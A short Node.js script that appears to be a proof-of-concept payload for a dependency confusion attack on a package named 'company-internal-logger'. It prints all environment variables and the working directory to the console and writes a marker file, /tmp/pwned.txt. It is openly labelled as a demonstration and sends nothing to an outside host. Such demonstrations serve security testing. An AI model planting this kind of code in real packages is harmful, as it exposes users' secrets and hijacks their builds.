console.log("-----------------------------------------");
console.log("       🚨 Malicious code executed! 🚨    ");
console.log("-----------------------------------------");
console.log("  The `company-internal-logger` package was");
console.log("  successfully replaced by an attacker's");
console.log("  version. The following data was exfiltrated:");
console.log("-----------------------------------------");
console.log(`  Current working directory: ${process.cwd()}`);
console.log(`  Environment variables: ${JSON.stringify(process.env, null, 2)}`);
console.log("-----------------------------------------");

const fs = require('fs');
fs.writeFileSync('/tmp/pwned.txt', 'This file was created by a malicious dependency confusion attack.');

console.log("  A file named pwned.txt has been created in the /tmp directory.");
console.log("  Attack complete.");
console.log("-----------------------------------------");